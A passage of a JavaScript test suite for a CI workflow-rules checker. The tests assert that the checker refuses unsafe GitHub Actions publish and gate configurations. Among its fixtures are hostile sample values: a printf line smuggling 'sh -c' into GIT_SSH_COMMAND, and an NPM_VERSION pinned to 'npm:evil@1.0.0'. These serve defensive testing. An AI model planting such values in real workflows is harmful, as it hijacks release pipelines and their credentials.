    fires(run(swap(INSTALL_STEP, '      - run: echo "$RUNNER_OS"')), /reads \$RUNNER_OS/);
  });
});

describe("rule 3 judges what bash passes, never the quoted source (#794 review, round 4)", () => {
  // The git isolation a credentialed git step must carry (round 5), so a git
  // row is judged on its words.
  const block = (cmd) =>
    `      - env:\n          GIT_CONFIG_GLOBAL: /dev/null\n          GIT_CONFIG_NOSYSTEM: "1"\n        run: |\n          ${cmd.replace(/\n/g, "\n          ")}`;
  const inPublish = (cmd) => run(swap(PUBLISH_STEP, block(cmd)));
  it.each([
    ["printf '-v' X y", "printf '-v' X y"],
    ["printf '-vX' y", "printf '-vX' y"],
    ["printf '-v' HOME", "printf '-v' HOME 'publish-tmp'"],
    ['printf "-v"', 'printf "-v" GIT_SSH_COMMAND "sh -c %s #" id'],
    ["printf '-vHOME'", "printf '-vHOME' 'publish-tmp'"],
    ["printf with another format", "printf '%b' x"],
    ["printf with --", "printf -- '%s\\n' x"],
  ])("refuses %s", (_, cmd) => fires(inPublish(cmd), /printf takes no option/));
  it.each([
    ["a quoted subcommand that is not the allowed one", "'npm' 'ci'", /npm runs only `publish`/],
    ["a quoted git subcommand", "git 'config' x y", /git runs only init/],
    ["a quoted assignment word", "'X'=1 echo", /not a command|assigns no variable/],
    ["a command name from an expansion", '"$X"', /\$\{X\} is not a command/],
  ])("refuses %s", (_, cmd, re) => fires(inPublish(cmd), re));
  it.each([
    ["a quoted command name", "'printf' '%s\\n' x"],
    ["a quoted npm subcommand", `npm 'publish' --ignore-scripts "./release/$ARTIFACT"`],
    ["a quoted git subcommand", "git 'rev-parse' refs/heads/main"],
  ])("judges %s by what bash passes, and accepts it", (_, cmd) =>
    expect(inPublish(cmd)).toEqual([]),
  );
  it.each([
    ["HOME", "/tmp/h"],
    ["XDG_CONFIG_HOME", "publish-tmp"],
    ["GIT_CONFIG_GLOBAL", "publish-tmp/.gitconfig"],
    ["GIT_CONFIG_NOSYSTEM", "0"],
  ])("refuses %s=%s in a credentialed env:", (name, value) =>
    fires(
      run(swap(PUBLISH_STEP, `      - env:\n          ${name}: ${value}\n        run: echo hi`)),
      new RegExp(`sets ${name}, which points every tool at another configuration`),
    ),
  );
  it("accepts the git config isolation values", () =>
    expect(
      run(
        swap(
          PUBLISH_STEP,
          '      - env:\n          GIT_CONFIG_GLOBAL: /dev/null\n          GIT_CONFIG_NOSYSTEM: "1"\n        run: echo hi',
        ),
      ),
    ).toEqual([]));
});

describe("9 below the workflow: no redefined pin, every *_VERSION exact (#794 review, round 4)", () => {
  const jobEnv = (kv) =>
    swap(
      "    environment: sdk-publish-npm\n",
      `    environment: sdk-publish-npm\n    env:\n      ${kv}\n`,
    );
  it.each([
    ["a job env", (kv) => jobEnv(kv)],
    [
      "a step env",
      (kv) => swap(PUBLISH_STEP, `      - env:\n          ${kv}\n        run: echo hi`),
    ],
    ["a pack job's env", (kv) => swap("  pack-npm:\n", `  pack-npm:\n    env:\n      ${kv}\n`)],
  ])("%s that redefines NPM_VERSION as npm:evil@1.0.0", (_, at) =>
    fires(
      run(at("NPM_VERSION: npm:evil@1.0.0")),
      /env NPM_VERSION redefines the workflow's NPM_VERSION/,
    ),
  );
  it.each(["RUST_VERSION: 1.88.0", "UNIT_COORDINATES: evil", "UNIT_PATH: apps/y"])(
    "a job env that redefines %s",
    (kv) => fires(run(jobEnv(kv)), /redefines the workflow's/),
  );
  it("a job-level *_VERSION that is not exact", () =>
    fires(
      run(swap("  pack-npm:\n", '  pack-npm:\n    env:\n      DENO_VERSION: "2"\n')),
      /env DENO_VERSION is 2, not an exact version/,
    ));
  it("accepts an exact *_VERSION, and the resolver's unit version", () =>
    expect(
      run(
        swap(
          "  pack-npm:\n",
          '  pack-npm:\n    env:\n      DENO_VERSION: "2.8.2"\n      OTHER_VERSION: ${{ needs.setup.outputs.version }}\n',
        ),
      ),
    ).toEqual([]));
});

describe("14 a status function cannot run a job past a failed workflow-rules (#794 review, round 4)", () => {
  const W = (jobs) => parseYaml(`on: push\njobs:\n${jobs}`);
  const GATE = "  workflow-rules:\n    steps: []\n  setup:\n    needs: workflow-rules\n";
  const pub = (jobs) =>
    releaseGateFindings({
      "sdk-publish.yml": W(`${GATE}${jobs}`),
      "cli-release.yml": W("  workflow-rules:\n    steps: []\n"),
    }).map((f) => `${f.job}: ${f.why}`);
  const PAST = /can run when workflow-rules did not succeed/;
  it.each([
    ["always() alone", "always()"],
    ["failure() alone", "failure()"],
    ["the success conjunct inside an ||", "always() && (needs.setup.result == 'success' || true)"],
    [
      "a success conjunct of a job that is not a need",
      "always() && needs.other.result == 'success'",
    ],
    ["!cancelled()", "!cancelled()"],
  ])("refuses %s", (_, cond) =>
    // A block scalar: `!` would otherwise be a YAML tag.
    expect(pub(`  pack-x:\n    needs: setup\n    if: >-\n      ${cond}\n`).join()).toMatch(PAST),
  );
  it("refuses a chain whose link runs past the gate", () =>
    expect(
      pub(
        `  pack-x:\n    needs: setup\n    if: always()\n  publish-x:\n    needs: pack-x\n    if: always() && needs.pack-x.result == 'success'\n`,
      ).join(),
    ).toMatch(/publish-x: can run when/));
  it.each([
    ["no status function", "needs.setup.outputs.gate == 'test'"],
    ["always() with the need's success", "always() && needs.setup.result == 'success'"],
  ])("accepts %s", (_, cond) =>
    expect(pub(`  pack-x:\n    needs: setup\n    if: ${cond}\n`)).toEqual([]),
  );
  describe("conclude runs always() only while its first statements fail on the gate", () => {
    const conclude = (run, env = "    env:\n      NEEDS: ${{ toJSON(needs) }}\n") =>
      pub(
        `  conclude:\n    needs: [workflow-rules, setup]\n    if: always()\n${env}    steps:\n      - run: ${JSON.stringify(run)}\n`,
      );
    const PARSE = "const needs = JSON.parse(process.env.NEEDS);";
    const GATE =
      'if (needs["workflow-rules"]?.result !== "success") { console.error("::error::refused"); process.exit(1); }';
    const ok = `node -e '\n  ${PARSE}\n  ${GATE}\n  report();\n'`;
    it("accepts the real shape", () => expect(conclude(ok)).toEqual([]));
    it.each([
      ["a check that does not exit", ok.replace(" process.exit(1);", "")],
      ["exit 0", ok.replace("process.exit(1)", "process.exit(0)")],
      [
        "the check after another statement",
        ok.replace(`  ${PARSE}\n`, `  ${PARSE}\n  report();\n`),
      ],
      ["the comparison only mentioned", `node -e '\n  ${PARSE}\n  // ${GATE}\n'`],
      ["another command first", `echo hi\n${ok}`],
    ])("refuses %s", (_, run) => expect(conclude(run).join()).toMatch(/conclude: can run when/));
    it("refuses a NEEDS that is not toJSON(needs)", () =>
      expect(conclude(ok, "    env:\n      NEEDS: '{}'\n").join()).toMatch(
        /conclude: can run when/,
      ));
  });
  it.each(["if: false", "continue-on-error: true"])("refuses a gate step with %s", (kv) =>
    expect(
      releaseGateFindings({
        "sdk-publish.yml": W(
          `  workflow-rules:\n    steps:\n      - ${kv}\n        run: pnpm run verify:workflows\n`,
        ),
        "cli-release.yml": W("  workflow-rules:\n    steps: []\n"),
      })
        .map((f) => f.why)
        .join(),
    ).toMatch(/step \? sets (if|continue-on-error):, so the rules can be skipped/),
  );
});

describe("15 an assignment counts only at command position (round 5)", () => {
  const pack = (body) =>
    run(swap(INSTALL_STEP, `      - run: |\n          ${body.replace(/\n/g, "\n          ")}`));
  it.each([
    ["a comment", '# FOO=\necho "${FOO}"'],
    ["a trailing comment", 'echo hi # FOO=1\necho "$FOO"'],
    ["a quoted NAME=", 'echo "FOO=x"\necho "$FOO"'],
    ["a single-quoted NAME=", "echo 'FOO=x'\necho \"$FOO\""],
    ["prose in an argument", 'echo set FOO=1 first\necho "$FOO"'],
    ["a ; inside double quotes", 'echo "a; FOO=1"\necho "$FOO"'],
    ["a ; inside single quotes", "echo 'a; FOO=1'\necho \"$FOO\""],
    ["a ; inside a comment", 'echo hi # a; FOO=1\necho "$FOO"'],
    ["a keyword in prose", 'echo do FOO=1\necho "$FOO"'],
    ["then in prose", 'echo then FOO=1\necho "$FOO"'],
    ["a subshell's assignment", '(FOO=1); echo "$FOO"'],
    ["a subshell's later assignment", '(true; FOO=1); echo "$FOO"'],
    ["an unquoted $( )'s later assignment", 'X=$(true; FOO=1)\necho "$X $FOO"'],
    ["an assignment inside $( )", 'X="$(FOO=1; echo)"\necho "$X $FOO"'],
    ["a here-document body", 'cat <<EOF\nFOO=1\nEOF\necho "$FOO"'],
  ])("%s does not define the name", (_, body) => {
    fires(pack(body), /reads \$FOO, which no env:/);
    // And in a block the strict grammar cannot read (a pack job's $( )).
    fires(pack(`X="$(true)"\necho "$X"\n${body}`), /reads \$FOO, which no env:/);
  });
  it.each([
    ["a plain assignment", 'FOO="$(date)"\necho "$FOO"'],
    ["one after &&", 'true && FOO=1\necho "$FOO"'],
    ["one inside then", 'if true; then FOO=1; fi\necho "$FOO"'],
    ["local", 'f() { local FOO=1; echo "$FOO"; }'],
    ["a while read", 'while IFS= read -r FOO; do echo "$FOO"; done < x'],
    ["a for loop", 'for FOO in a b; do echo "$FOO"; done'],
    ["one after a here-string", 'cat <<< EOF\nFOO=1\necho "$FOO"'],
  ])("%s defines the name", (_, body) => {
    expect(pack(body)).toEqual([]);
    expect(pack(`X="$(true)"\necho "$X"\n${body}`)).toEqual([]);
  });
});

describe("an input redirection reads only what the job wrote or downloaded (round 5)", () => {
  const block = (pre, cmd) => swap(PUBLISH_STEP, `${pre}      - run: ${cmd}`);
  const DL = (path) =>
    `      - uses: actions/download-artifact@${SHA}\n        with:\n          name: release-npm\n          path: ${path}\n`;
  it("accepts a file under this job's download path, and publish-tmp/", () => {
    expect(run(block(DL("release"), "sort < release/x"))).toEqual([]);
    expect(run(block("", "sort < publish-tmp/x"))).toEqual([]);
  });
  it.each([
    ["dist/ when the job downloads to release/", DL("release"), "sort < dist/x"],
    ["the download path itself, not a file under it", DL("release"), "sort < release"],
    ["a path that only starts with the download's name", DL("release"), "sort < release-other/x"],
  ])("refuses %s", (_, pre, cmd) =>
    fires(
      run(block(pre, cmd)),
      /reads input only from publish-tmp\/ or a path this job downloads to/,
    ),
  );
});

describe("19 the SDK gates' own shape (#793)", () => {
  const G = "sdk-gates.yml";
  const REAL = {
    settings: JSON.parse(readFileSync(join(ROOT, SETTINGS), "utf8")),
    manifest: JSON.parse(readFileSync(join(ROOT, MANIFEST), "utf8")),
    ...readWorkflows(ROOT),
  };
  const SCRIPTS = readScriptOutputs(ROOT);
  const report = (t) =>
    allFindings({ ...t, scriptOutputs: SCRIPTS, actions: readLocalActions(ROOT) }).map(
      (f) => `${f.file}: ${f.job}: ${f.why}`,
    );
  /**
   * Every finding of the real tree after `mutate`, through the gate's one
   * aggregate. structuredClone keeps a shared array shared, so a step reached
   * through `jobs.gate` is gate-known-red's too, as the parsed alias is.
   */
  const after = (mutate) => {
    const t = structuredClone(REAL);
    mutate({ ...t, doc: t.workflows[G], jobs: t.workflows[G].jobs });
    return report(t);
  };
  /**
   * The same after editing a workflow's TEXT, the one copy a maintainer
   * edits: the edit must apply, and both the parsed tree and the source the
   * anchor rule reads are the edited file.
   */
  const afterText = (edit, file = G) => {
    const t = structuredClone(REAL);
    const text = edit(t.sources[file]);
    if (text === t.sources[file]) throw new Error(`the edit does not apply to ${file}`);
    t.sources[file] = text;
    t.workflows[file] = parseYaml(text);
    return report(t);
  };
  /** Replace exactly one occurrence of `from`; a fixture that no longer applies throws. */
  const once = (from, to) => (text) => {
    if (text.split(from).length !== 2) throw new Error(`not exactly one ${JSON.stringify(from)}`);
    return text.replace(from, () => to);
  };
  const ofJob = (got, job) => got.filter((g) => g.startsWith(`${G}: ${job}: `));
  const step = (job, name) => job.steps.find((x) => x.name === name);
  const conclude = (jobs) =>
    step(jobs["sdk-gates"], "Conclude (tools/repo-gates/conclude-sdk-gates.mjs)");

  const precheck = (jobs) =>
    jobs.swift.steps.find((x) => x.run === "bash scripts/swift-precheck.sh");
  const nativeLive = (jobs) =>
    jobs.swift.steps.find((x) => x.run === "node tools/repo-gates/run-live-suite.mjs");

  it("control: the real tree is clean", () => expect(after(() => {})).toEqual([]));

  it.each([
    ["no schedule", ({ doc }) => void delete doc.on.schedule, /no single daily schedule/],
    [
      "a weekly schedule",
      ({ doc }) => void (doc.on.schedule = [{ cron: "23 4 * * 1" }]),
      /no single daily schedule/,
    ],
    [
      "two schedules",
      ({ doc }) => void doc.on.schedule.push({ cron: "0 0 * * *" }),
      /no single daily schedule/,
    ],
    ["no push trigger", ({ doc }) => void delete doc.on.push, /every push to main/],
    [
      "a push to another branch",
      ({ doc }) => void (doc.on.push.branches = ["dev"]),
      /every push to main/,
    ],
    [
      "a push with no branch filter (tags too)",
      ({ doc }) => void (doc.on.push = null),
      /every push to main/,
    ],
    ["no pull_request trigger", ({ doc }) => void delete doc.on.pull_request, /every pull request/],
    [
      "paths: on pull_request",
      ({ doc }) => void (doc.on.pull_request = { paths: ["apps/**"] }),
      /sdk-gates\.yml: -: filters pull_request by paths/,
    ],
    [
      "paths-ignore: on push",
      ({ doc }) => void (doc.on.push["paths-ignore"] = ["docs/**"]),
      /filters push by paths-ignore/,
    ],
    [
      "a fourth trigger",
      ({ doc }) => void (doc.on.workflow_dispatch = null),
      /triggers on workflow_dispatch, beyond push, pull_request, schedule/,
    ],
    [
      "top-level contents: write",
      ({ doc }) => void (doc.permissions = { contents: "write" }),
      /top-level permissions: is not exactly contents: read/,
    ],
    [
      "a head_ref concurrency key",
      ({ doc }) => void (doc.concurrency.group = "sdk-gates-${{ github.head_ref || github.ref }}"),
      /concurrency group is not keyed on github\.ref/,
    ],
    [
      "a concurrency key on github.ref_name",
      ({ doc }) => void (doc.concurrency.group = "sdk-gates-${{ github.ref_name }}"),
      /concurrency group is not keyed on github\.ref/,
    ],
    [
      "no timeout-minutes on a job",
      ({ jobs }) => void delete jobs.gate["timeout-minutes"],
      /sdk-gates\.yml: gate: sets no timeout-minutes/,
    ],
    [
      "a timeout from an expression",
      ({ jobs }) => void (jobs.select["timeout-minutes"] = "${{ 600 }}"),
      /select: sets no timeout-minutes/,
    ],
    [
      "ubuntu-latest",
      ({ jobs }) => void (jobs.gate["runs-on"] = "ubuntu-latest"),
      /gate: runs on "ubuntu-latest", not one of ubuntu-24\.04, macos-15/,
    ],
    [
      "a self-hosted runner",
      ({ jobs }) => void (jobs.swift["runs-on"] = ["self-hosted", "macos"]),
      /swift: runs on \["self-hosted","macos"\]/,
    ],
    [
      "fail-fast: true",
      ({ jobs }) => void (jobs.gate.strategy["fail-fast"] = true),
      /gate: a matrix without fail-fast: false/,
    ],
    [
      "no fail-fast",
      ({ jobs }) => void delete jobs.smoke.strategy["fail-fast"],
      /smoke: a matrix without fail-fast: false/,
    ],
    [
      "no empty-matrix guard",
      ({ jobs }) => void delete jobs.gate.if,
      /gate: its if: is not exactly needs\.select\.outputs\.gate != '\[\]'/,
    ],
    [
      "a guard on another kind's output",
      ({ jobs }) => void (jobs["gate-known-red"].if = "needs.select.outputs.gate != '[]'"),
      /gate-known-red: its if: is not exactly needs\.select\.outputs\.known_red/,
    ],
    [
      "a matrix fed by another kind's output",
      ({ jobs }) =>
        void (jobs.gate.strategy.matrix.sdk = "${{ fromJSON(needs.select.outputs.known_red) }}"),
      /gate: its matrix is not exactly sdk: \$\{\{ fromJSON\(needs\.select\.outputs\.gate\) \}\}/,
    ],
    [
      "a literal SDK list",
      ({ jobs }) => void (jobs.gate.strategy.matrix.sdk = [{ name: "node", daggerFn: "js-test" }]),
      /gate: its matrix is not exactly sdk:/,
    ],
    [
      "a kind's job removed",
      ({ jobs, doc }) => {
        delete jobs.swift;
        doc.jobs["sdk-gates"].needs = ["select", "gate", "gate-known-red", "smoke"];
      },
      /swift: is missing: the swift selection would run nowhere/,
    ],
    [
      "a matrix no select output feeds",
      ({ jobs }) =>
        void (jobs.extra = {
          "runs-on": "ubuntu-24.04",
          "timeout-minutes": 5,
          strategy: { "fail-fast": false, matrix: { sdk: ["node"] } },
          steps: [{ run: "true" }],
        }),
      /extra: a matrix no select output feeds/,
    ],
    [
      "an aggregate that does not need every job",
      ({ jobs }) => void (jobs["sdk-gates"].needs = ["select", "gate", "gate-known-red", "swift"]),
      /sdk-gates: needs \[gate, gate-known-red, select, swift\], not every other job/,
    ],
    [
      "an aggregate on success()",
      ({ jobs }) => void (jobs["sdk-gates"].if = "success()"),
      /sdk-gates: its if: is not exactly always\(\)/,
    ],
    [
      "a conclude step that can be skipped",
      ({ jobs }) => void (conclude(jobs).if = "github.event_name == 'push'"),
      /its conclude step can be skipped/,
    ],
    [
      "a conclude step without toJSON(needs)",
      ({ jobs }) => void (conclude(jobs).env = { NEEDS_JSON: "{}" }),
      /does not read NEEDS_JSON: \$\{\{ toJSON\(needs\) \}\}/,
    ],
    [
      "no aggregate",
      ({ jobs }) => void (conclude(jobs).run = "echo green"),
      /0 jobs run `node tools\/repo-gates\/conclude-sdk-gates\.mjs`, not exactly one/,
    ],
    [
      "an aggregate that is not a required check",
      ({ jobs }) => void (jobs["sdk-gates"].name = "sdk gates (all)"),
      /its check "sdk gates \(all\)" is not one of/,
    ],
    [
      "two jobs named sdk gates",
      ({ jobs }) => void (jobs.select.name = "sdk gates"),
      /required check "sdk gates" is produced by 2 jobs \(sdk-gates\.yml#select, sdk-gates\.yml#sdk-gates\), not exactly one/,
    ],
    [
      "a required check no job produces",
      ({ workflows }) => void (workflows["verify.yml"].jobs.verify.name = "verify"),
      /required check "pnpm run verify" is produced by 0 jobs, not exactly one/,
    ],
    [
      "a selector that is not the select step",
      ({ jobs }) =>
        void (step(jobs.select, "Select the SDKs (tools/repo-gates/select-sdks.mjs)").id = "pick"),
      /select: has no step with id select that runs/,
    ],
    [
      "a select output not handed on",
      ({ jobs }) => void delete jobs.select.outputs.smoke,
      /select: its outputs are not exactly gate, known_red, swift, smoke, gate_files, summary/,
    ],
    [
      "an environment",
      ({ jobs }) => void (jobs.gate.environment = "sdk-publish-npm"),
      /sdk-gates\.yml: gate: binds an environment/,
    ],
    [
      "github.token in an env",
      ({ jobs }) => void (conclude(jobs).env.GH_TOKEN = "${{ github.token }}"),
      /an expression names a token or a secret/,
    ],
    [
      "a secret in an env",
      ({ jobs }) => void (conclude(jobs).env.X = "${{ secrets.X }}"),
      /an expression names a token or a secret/,
    ],
    [
      "a checkout that keeps its credential",
      ({ jobs }) => void delete step(jobs.gate, "Checkout").with["persist-credentials"],
      /gate: a checkout keeps its credential/,
    ],
    [
      "a Dagger cloud token",
      ({ jobs }) =>
        void (step(jobs.gate, "Run ${{ matrix.sdk.daggerFn }} (Dagger)").with["cloud-token"] = "x"),
      /gate: a step passes cloud-token/,
    ],
    [
      "a Dagger cache configuration",
      ({ doc }) => void (doc.env._EXPERIMENTAL_DAGGER_CACHE_CONFIG = "type=gha"),
      /sets _EXPERIMENTAL_DAGGER_CACHE_CONFIG: no Dagger cloud or cache configuration/,
    ],
    // M12: the Xcode pin is scripts/swift-precheck.sh's, and so is what counts
    // as CI for it. No env: map of the workflow, a job or a step may select
    // Xcode or change CI mode, and no value may name an Xcode path.
    ...["DEVELOPER_DIR", "CI", "GITHUB_ACTIONS", "TOOLCHAINS"].flatMap((k) => {
      const v = { DEVELOPER_DIR: "/Applications/Xcode.app/Contents/Developer", CI: "" }[k] ?? "x";
      const env = (o) => void (o.env = { ...o.env, [k]: v });
      const re = (where) => new RegExp(`sdk-gates\\.yml: ${where}: sets ${k} in an env:`);
      return [
        [`${k} in the workflow env:`, ({ doc }) => env(doc), re("-")],
        [`${k} in a job env:`, ({ jobs }) => env(jobs.swift), re("swift")],
        [`${k} in a step env:`, ({ jobs }) => env(precheck(jobs)), re("swift")],
      ];
    }),
    [
      "an Xcode path in a run: value",
      ({ jobs }) =>
        void jobs.swift.steps.splice(1, 0, {
          name: "Select Xcode",
          run: "sudo xcode-select -s /Applications/Xcode_0.app",
        }),
      /sdk-gates\.yml: swift: a value names \/Applications\/Xcode/,
    ],
    [
      "an Xcode path in a with: value",
      ({ jobs }) =>
        void (step(jobs.gate, "Checkout").with.path = "/Applications/Xcode_0.app/Contents"),
      /sdk-gates\.yml: gate: a value names \/Applications\/Xcode/,
    ],
    // Listed, not restated: rule 3's caches and continueOnErrorFindings.
    [
      "a cache action",
      ({ jobs }) =>
        void jobs.gate.steps.splice(1, 0, {
          name: "cache",
          uses: "actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809",
          with: { path: "x", key: "k" },
        }),
      /gate step cache: a gate job restores a cache/,
    ],
    [
      "setup-node's cache input",
      ({ jobs }) => void (step(jobs.select, "Setup Node.js").with.cache = "pnpm"),
      /select step Setup Node\.js: a gate job restores a cache/,
    ],
    [
      "a step continue-on-error",
      ({ jobs }) =>
        void (step(jobs.gate, "Run ${{ matrix.sdk.daggerFn }} (Dagger)")["continue-on-error"] =
          true),
      /sdk-gates\.yml: gate: step Run .* sets continue-on-error:/,
    ],
    [
      "a job continue-on-error",
      ({ jobs }) => void (jobs.gate["continue-on-error"] = true),
      /sdk-gates\.yml: gate: sets continue-on-error:/,
    ],
    // The required checks' shape.
    [
      "no requiredChecks",
      ({ settings }) => void delete settings.requiredChecks,
      /release-settings\.json: -: declares no requiredChecks/,
    ],
    [
      "an integrationId that is a string",
      ({ settings }) => void (settings.requiredChecks.integrationId = "15368"),
      /requiredChecks\.integrationId is not a GitHub App id/,
    ],
    [
      "no checks",
      ({ settings }) => void (settings.requiredChecks.checks = []),
      /requiredChecks\.checks is not a list of check names/,
    ],
    [
      "a check named twice",
      ({ settings }) => void settings.requiredChecks.checks.push("sdk gates"),
      /requiredChecks\.checks names a check twice/,
    ],
    [
      "an unknown requiredChecks key",
      ({ settings }) => void (settings.requiredChecks.strict = true),
      /requiredChecks\.strict is not one of ruleset, integrationId, checks/,
    ],
    [
      "no ruleset name",
      ({ settings }) => void (settings.requiredChecks.ruleset = ""),
      /requiredChecks\.ruleset is not a ruleset name/,
    ],
    // The manifest: exactly one of daggerFn or ci.native.
    [
      "an SDK with neither daggerFn nor ci.native",
      ({ manifest }) => void delete manifest.sdks.find((x) => x.name === "swift").ci.native,
      /dagger\/sdk-manifest\.json: swift: has neither of daggerFn and ci\.native/,
    ],
    [
      "an SDK with both",
      ({ manifest }) =>
        void (manifest.sdks.find((x) => x.name === "node").ci = { native: "macos" }),
      /dagger\/sdk-manifest\.json: node: has both daggerFn and ci\.native/,
    ],
    // The macOS job's steps (#924): the precheck, then the live suite natively.
    [
      "swift: no live step",
      ({ jobs }) =>
        void (jobs.swift.steps = jobs.swift.steps.filter((x) => x !== nativeLive(jobs))),
      /swift: has no step running `node tools\/repo-gates\/run-live-suite\.mjs`/,
    ],
    [
      "swift: a second live step",
      ({ jobs }) => void jobs.swift.steps.push(structuredClone(nativeLive(jobs))),
      /swift: runs 2 live steps, not exactly one/,
    ],
    [
      "swift: a live step that runs whatever the leg says",
      ({ jobs }) => void (nativeLive(jobs).if = "always()"),
      /swift: its live step's if: is not exactly matrix\.sdk\.live/,
    ],
    [
      "swift: a live step for a fixed SDK",
      ({ jobs }) => void (nativeLive(jobs).env.SDK = "swift"),
      /swift: its live step's env: is not exactly SDK: \$\{\{ matrix\.sdk\.name \}\}/,
    ],
    [
      "swift: the live step before the precheck",
      ({ jobs }) => {
        const st = jobs.swift.steps;
        const [l] = st.splice(st.indexOf(nativeLive(jobs)), 1);
        st.splice(st.indexOf(precheck(jobs)), 0, l);
      },
      /swift: its live step does not come after its suite/,
    ],
    [
      "swift: the precheck behind an if:",
      ({ jobs }) => void (precheck(jobs).if = "matrix.sdk.live"),
      /swift: has no unconditional step running `bash scripts\/swift-precheck\.sh`/,
    ],
    [
      "swift: no workspace install before the live step",
      ({ jobs }) =>
        void (jobs.swift.steps = jobs.swift.steps.filter(
          (x) => x.run !== "pnpm install --frozen-lockfile",
        )),
      /swift: has no `pnpm install --frozen-lockfile` step between its suite and its live step/,
    ],
    [
      "swift: no harness build before the live step",
      ({ jobs }) =>
        void (jobs.swift.steps = jobs.swift.steps.filter((x) => !/--filter/.test(x.run ?? ""))),
      /swift: has no `pnpm --filter @confeature\/test-harness-live-contract build` step/,
    ],
    [
      "swift: Node at another version",
      ({ jobs }) =>
        void (jobs.swift.steps.find((x) => /setup-node/.test(x.uses ?? "")).with["node-version"] =
          "22"),
      /swift: has no `actions\/setup-node@[0-9a-f]+ with node-version: \$\{\{ env\.NODE_VERSION \}\}` step/,
    ],
    [
      "swift: pnpm set up after the install",
      ({ jobs }) => {
        const st = jobs.swift.steps;
        const [p] = st.splice(
          st.findIndex((x) => /pnpm\/action-setup/.test(x.uses ?? "")),
          1,
        );
        st.splice(st.indexOf(nativeLive(jobs)), 0, p);
      },
      /swift: its live-suite preparation is not in order/,
    ],
    [
      "the workflow removed",
      ({ workflows }) => void delete workflows[G],
      /sdk-gates\.yml: -: is missing/,
    ],
  ])("refuses %s", (_name, mutate, re) => {
    const got = after(mutate);
    expect(
      got.some((g) => re.test(g)),
      got.join("\n") || "no finding",
    ).toBe(true);
  });

  // The Dagger legs' steps (#918): the suite, then the live suite. Each kind
  // is held on its own steps: given its own copy (the alias broken, as an
  // inline list would), a fault in one job is that job's finding alone.
  const isLive = (x) => x.name === "Run live-suite --sdk ${{ matrix.sdk.name }} (Dagger)";
  const isSuite = (x) => x.name === "Run ${{ matrix.sdk.daggerFn }} (Dagger)";
  const LEG_FAULTS = [
    [
      "no live-suite step",
      (st) => st.filter((x) => !isLive(x)),
      /has no step running live-suite --sdk/,
    ],
    [
      "a live-suite step that runs whatever the leg says",
      (st) => void (st.find(isLive).if = "always()"),
      /its live-suite step's if: is not exactly matrix\.sdk\.live/,
    ],
    [
      "a live-suite step for another SDK",
      (st) => void (st.find(isLive).with.args = "live-suite --sdk node --source=."),
      /has no step running live-suite --sdk/,
    ],
    [
      "the live suite before the suite",
      (st) => {
        const [l] = st.splice(st.findIndex(isLive), 1);
        st.splice(st.findIndex(isSuite), 0, l);
      },
      /its live-suite step does not come after its suite/,
    ],
    [
      "the suite step behind an if:",
      (st) => void (st.find(isSuite).if = "matrix.sdk.live"),
      /has no unconditional step running \$\{\{ matrix\.sdk\.daggerFn \}\}/,
    ],
    [
      "a third Dagger step",
      (st) => void st.push(structuredClone(st.find(isSuite))),
      /runs 3 Dagger steps, not exactly its suite and its live suite/,
    ],
    [
      "a live-suite step through another action",
      (st) => void (st.find(isLive).uses = "dagger/dagger-for-github@v8"),
      /its live-suite step does not use the suite step's action/,
    ],
  ];
  const LEGS = ["gate", "gate-known-red"];
  const otherLeg = (job) => LEGS.find((j) => j !== job);
  it.each(LEGS.flatMap((job) => LEG_FAULTS.map(([name, fault, re]) => [job, name, fault, re])))(
    "%s, given its own steps, refuses %s for that job alone",
    (job, _name, fault, re) => {
      const got = after(({ jobs }) => {
        const own = structuredClone(jobs[job].steps);
        jobs[job].steps = fault(own) ?? own;
      });
      expect(
        ofJob(got, job).some((g) => re.test(g)),
        got.join("\n") || "no finding",
      ).toBe(true);
      expect(ofJob(got, otherLeg(job))).toEqual([]);
    },
  );

  // B1: the Dagger leg is written once, under gate (`steps: &dagger-leg`),
  // and gate-known-red aliases it. An edit to the one copy reaches both.
  const SUITE_LINE = "args: ${{ matrix.sdk.daggerFn }} --source=.";
  it("the real file writes the leg once: one suite step, one live step, one summary step", () => {
    for (const needle of [SUITE_LINE, "args: live-suite --sdk", "if: always()\n        env:"])
      expect(REAL.sources[G].split(needle).length - 1, needle).toBe(1);
    expect(REAL.workflows[G].jobs.gate.steps).toBe(REAL.workflows[G].jobs["gate-known-red"].steps);
  });
  it("M1: the suite's args changed in the one copy is refused for gate and gate-known-red", () => {
    const got = afterText(once(SUITE_LINE, `${SUITE_LINE} --debug`));
    for (const job of LEGS)
      expect(ofJob(got, job), got.join("\n")).toContainEqual(
        `${G}: ${job}: has no unconditional step running \${{ matrix.sdk.daggerFn }} --source=.`,
      );
  });
  it("M2: gate-known-red with an inline list that has no live step is refused, for it alone", () => {
    const inline = stringifyYaml(REAL.workflows[G].jobs.gate.steps.filter((x) => !isLive(x)))
      .trimEnd()
      .split("\n")
      .map((l) => `      ${l}`)
      .join("\n");
    const got = afterText(once("    steps: *dagger-leg\n", `    steps:\n${inline}\n`));
    expect(ofJob(got, "gate-known-red"), got.join("\n")).toEqual(
      expect.arrayContaining([
        expect.stringMatching(/gate-known-red: has no step running live-suite --sdk/),
        expect.stringMatching(
          /gate-known-red: jobs\.gate-known-red\.steps is not the alias \*dagger-leg/,
        ),
      ]),
    );
    expect(ofJob(got, "gate")).toEqual([]);
  });

  // The one summary step (FR-002, M15): it says "known red, not counted"
  // exactly when the leg has a ticket, which only a known-red leg may carry
  // (select-sdks.mjs legProblem), and the ticket reaches it through env: only.
  const SUMMARY_IF = "        if: always()\n        env:\n          SDK:";
  it.each([
    [
      "its branch inverted",
      once('if [ -n "${TICKET}" ]', 'if [ -z "${TICKET}" ]'),
      [/its summary step's run: is not exactly/],
    ],
    [
      "TICKET moved into run: as an expression",
      (t) =>
        once(
          "known red ${TICKET}",
          "known red ${{ matrix.sdk.ticket }}",
        )(once("          TICKET: ${{ matrix.sdk.ticket }}\n", "")(t)),
      [/its summary step's env: is not exactly/, /its summary step's run: is not exactly/],
    ],
    [
      "its if: always() dropped",
      once(SUMMARY_IF, "        env:\n          SDK:"),
      [/its summary step's if: is not exactly always\(\)/],
    ],
    [
      "its status read from elsewhere",
      once("STATUS: ${{ job.status }}", "STATUS: success"),
      [/its summary step's env: is not exactly/],
    ],
  ])("the summary step with %s is refused, for gate and gate-known-red", (_name, edit, res) => {
    const got = afterText(edit);
    for (const job of LEGS)
      for (const re of res)
        expect(
          ofJob(got, job).some((g) => re.test(g)),
          `${job} ${re}\n${got.join("\n")}`,
        ).toBe(true);
  });
  it("a second summary step is refused", () => {
    const got = after(
      ({ jobs }) =>
